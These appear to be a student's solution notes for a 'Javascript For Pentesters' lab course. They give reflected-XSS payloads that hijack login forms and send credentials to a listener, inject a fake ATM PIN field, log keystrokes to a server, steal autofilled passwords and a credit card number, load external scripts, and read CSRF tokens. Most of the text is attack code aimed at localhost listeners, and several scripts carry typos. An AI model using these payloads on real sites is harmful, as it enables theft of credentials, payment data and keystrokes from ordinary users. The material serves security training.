                    Javascript For Pentesters
                    Notes on Solutions
                    
                    
1 - Modify Html
The task is to modify a couple of page elements.
Source code of page is examined so that items to be modified can be identified in their elements eg H1, div etc
In the example the innerHtml of a h2 tag will need to be modified as well as a h1 tag
The JS script that is used to change the tags which contain the items to be changed is
Script Syntax
  <script>
    // Gets the third h2 tag
    document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
    // get the first h1 tag
    doucment.getElementsByTagName("h1")[0].innerHTML = "Found You";
  </script>
On the sample page anything entered into the searchbox will be reflected back to the page 
  - This field can be used for xss injection
The script is ran through a url encoder
  - https://meyerweb.com/eric/tools/dencoder/
The script is added to the url parameter in the address bar in the browser


2 - Change All Links
The task on this occasion is to change on links on a page to point to a given url
Similar to the previous task the page reflects back what is typed in the box making it vulnerable to a XSS attack
Script Syntax
<script>
  // Gives all the a href links
  var links = document.getElementsByTagName("a");
  
  // Iterates through the links but there are many different ways of doing this
  for(i = 0; i < links.length; i++){
    // Change the url at each link in the array
    links[i].href = "url";
    links[i}.innerHTML = "Link Modified";
  }
</script>
Again run the script through the urlencoder and add as a paremeter to url in the address bar


3 - Hijack Form Submit
First step is to inspect the source code -- ctrl-u
There is only a single form on the page
There are 2 input fields a username\email field and a password field
The first step will be to add an event handler which ensures that the exploit code is called when the form is submitted
Solution Syntax
  <script>
    function InterceptForm(){ 
      // There is only one form so the form will be value 0
      var username = document.forms[0].elements[0].value;
      var password = document.forms[0].elements[1].value;
      
      // Removed to show the sending to attackers server exampl
      // alert(username + ' : ' + password);
      
      new Image().src = "http://localhost:9000/?username="+username+"&password="+password;
    }
    
    document.forms[0].onsubmit = InterceptForm
  </script>
  Again the script is ran through a urlencoder and injected into the url parameter in the browser address bar
  Starting a web server to demo sending user details to an attackers server
  Starting a server can be done multiple ways but using python is the method shown here
    python -m SimpleHTTPServer 9000  -- This will start a server on port 9000


4 - Modify Form Fields
Using the same webpage as previous example
Injecting the code as a URL parameter it is reflected on to the page
The challenge is to add a new form element which will take an ATM pin number
As usual the first step is to examine the source code from the web page
There is only one form element
In order to accept PIN numbers there will have to be an input element of type text added to the form
The new element must match the look and feel of the existing elements
Solution Syntax
  <script>
    // To create an input element
    var input = document.createElement("input");
    
    // Input Attributes
    input.setAttribute("type", "text");
    input.setAttribute("class", "input-block-level");
    input.setAttribute("placeholder", "ATM PIN");
    input.setAttribute("name", "atmpin");
    
    // The newly created element will need to be added so a position in the form will be chosen
    var previous = document.forms[0].elements[0];
    
    // To insert a new element before another element such as the one named above
    document.forms[0].insertBefore(input, previous);
    
    // Ensure that the form action points to the server that we want
    document.forms[0].action = "http://localhost:9000/"
  </script>
Again the script is ran through a URL encoder and added to the URL parameter
Having a running server to test should show the pin number


5 Social Engineering
Using JS for Social Engineering Attack
Task is to replace existing form and add a please visit message
Again view the page source code
Solution Syntax
  <script>
    var input = document.createElement("h2");
    
    input.innerHTML = "Unfortunately the site is down please visit url;
    
    // In JS to remove a tag you find the parent of the tag and use it to remove the child tag
    
    // This adds the new input element
    document.forms[0].parentNode.appendChild(input);
    
    // This removes the form
    document.forms[0].parentNode.removeChild(document.forms[0]);
    
  </script>
Again the script is ran through a URL encoder and added as a parameter to url option in the address bar


6 Capture All Clicks
Capturing when a user clicks on a webpage and then redirect to a url
Solution Syntax
  <script>
    function CaughtClick(){
      // For testing
      alert("You Clicked");
      
      // add redirect url which will automaticall redirect when you click on the page
      location.href = "redirect url";
    }
    
    // To have the click handler called for every click anywhere on the page
    // will need and event listener called at the document body level
    document.body.addEventListener("Click", CaughtClick, true);
    
  </script>
Again the script is ran through a URL encoder and added as a parameter to url option in the address bar


7 - Keystroke Logging
The task is to log keystrokes live and post to an attack server
Solution Syntax
  <script>
    // Some browser do not support all keys so tracking using keyPress for tracking may not be the best method
    // Most recommend using keyUp but for consistency keyPress is used
    document.onkeypress = function KeyLogger(inp){
      key_pressed = String.fromCharCode(inp.which);
      
      // To send to example server
      new Image().src = "http://localhost:9000/?"+key_pressed;
    }
  </script>

Again the script is ran through a URL encoder and added as a parameter to url option in the address bar
Like previously a server for testing purpose can be ran in many ways, the python way is
  - python -m SimpleHTTPServer 9000  -- This will start a server on port 9000
  - You will see the keystrokes as part of a series of 200 & 301 HTTP Responses
  - Author recommends using the Symantec connect blogs for reading
    - https://www.symantec.com/connect/blogs


8 - Event Listener
Using event listener xss the task is to send the user password back to the user in an alert box when they click the sign in button.
Solution Syntax
  <script>
    // You could solve wthis with a simple mouseover to trigger the xss this can be done by adding
    // "onmouseover="alert(); to the url parameter
    // In this example though it will be a button click
    document.forms[0].onsubmit = function demo(){
      var pass = document.forms[0].elements[1].value;
      
      alert(pass);
    }
  </script>
Again it is best practice to urlencode to get the proper formatting


9 - Include External JS
The task is to include an external JS file into a page to pop a cookie into an alert box
You may need this when the field available to hold data is smaller than you need
Solution Syntax
  <script src="script name"> </script>
  
  // The script file which will need to be hosted for the url needed for the src file above
  // This allows for a large amount of functionality to be added to an attack 
  <script>
    window.addEventListener("load", function(){
      alert(document.cookie);
    });
  </script>


10 - Include External JS using JS
Similar to the previous challenge but you are not allowed to use the script tag in any way
As usual in the challenges there is an examination of the sample page source code.
The source code shows that the www passed to the url parameter is reflected within a script
The solution is to create a new script tage and then bind it to the source JS script
Solution Syntax
  var newtag = document.createElement("script");
  newtag.type  = "text/javascript";
  newtag.src = "script url";
  doucument.body.appendChild(newtag);
As usual encode and add to the url parameter


11 - Replacing Banner Image
Replacing the exiting image with a defacement image using JS only
Solution Syntax
  <script>
    document.getElementsByTagName("img")[0].src = "image url"    
  </script>
As usual encode and add to the url parameter
This is only happening on the client side only so the server remains untouched


12 - Stealing From Auto-Complete
Task is to complete an auto-complete option for the page and then wait for 10 seconds before submitting details to the attacker
Again the url parameter is used to mimic a XSS attack
As has been done before there is a server running
  - python -m SimpleHTTPServer 9000  -- This will start a server on port 9000
Solution Syntax
  <script>
    // This will allow the malicious code to be triggered after a specified time
    // In most programming languages it will be in milliseconds
    window.setTimeout(function(){
      document.forms[0].action = 'http://localhost:9000';
      document.forms[0].submit();
    }, 10000);
  </script>
Again as is standard practice script is encoded


13 - Posting with XmlHTTPRequest
Similar to the previous example but using XHR instead
Password should have already been saved in auto-complete
Solution Syntax
  <script>
    // Getting the password and username
    username = document.forms[0].elements[0].value;
    password = document.forms[0].elements[1].value;
    
    window.setTimeout(function(){
      // The XHR request
      var req = new XMLHttpRequest();
      req.open("GET", "http://localhost:8000/?username="+username+"&password="+password, true);
      req.send();
      
      // For checking 
      // alert(username + ":" password);
    }, 10000);
  </script>


14 - Fetch Data With XMLHttpRequest
Find and display a users email address from a different page
When viewing the source code for the page there is a comment
  - Email can be obtained using a GET request to a specific url with the users username
This is a fairly common scenario once an XSS vulnerability has been discovered
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      // Checks to see is there data waiting from the server
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML() = req.responseText; 
      }
    }
    
    // The lab has a specific url
    req.open("GET", "/lab/url/name=username", true);
    req.send();
  </script>


15 - Data Exfiltration With XMLHttpRequest
Use the xss on the page post the user credit card number to the attack server
Similar to the previous challenge the source code gives a hint
  - This time it is a POST request to a specific url with the users name
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      // Checks to see is there data waiting from the server
      if(req.readyState == 4 && req.status == 200){
        alert(req.responseText);
        new Image.src() = "http://localhost:8800/?cardno=" + req.responseText; 
      }
    }
    
    req.open("POST", "lab url", true);
    
    // Using POST instead of GET means that you have to list the content type
    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.send("user=username");
  </script>


16 - Extracting CSRF Tokens
CSRF - Cross Site Request Forgery
A lot of sites require CSRF tokens to preven forgery attacks
Javascript can read CSRF tokens
In the sample app the CSRF token is part of the url but this is not true of all sites
CSRF placement can be dependent on both developer and framework
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML = req.responseText;
      }
    }
    
    // Gets the url and splits it using the ampersand as a delimiter
    var token = window.location.search.split('&')[1];
    req.open("GET", "lab url/email?name=username&"+token, true);
    req.send();
  </script>
If you are vulnerable to XSS then CSRF protections are useless

17 - Stealing CSRF Tokens
Find user email address & display it in a div name result
No hardcoding can be used everything must be done dynamically
There are also hints available in the source code of the sample web page
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML = req.responseText;
      }
    }  
    
    // Gets the elements and splits
    var uid = document.getElementById("uid").innerHTML.split(':')[1];
    var token = document.getElementById("csrf").innerHTML.split(':')[1];
    req.open("GET", "lab url/email?uid="+uid+"&csrf_token="+token, true);
    req.send();
  </script>
